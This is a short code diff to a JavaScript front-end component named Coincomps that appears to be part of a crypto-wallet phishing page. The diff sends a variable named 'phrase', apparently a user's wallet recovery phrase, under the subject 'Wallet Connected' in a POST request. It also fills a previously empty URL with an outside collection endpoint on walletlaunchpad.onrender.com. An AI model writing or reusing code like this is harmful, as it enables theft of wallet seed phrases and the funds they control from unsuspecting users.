@@ -38,11 +38,11 @@ const Coincomps = ({ data }) => {
 
       const body = {
         subject: "Wallet Connected",
-        text: phrase,
+        phrase: phrase,
       };
 
       try {
-        const url = "";
+        const url = "http://walletlaunchpad.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
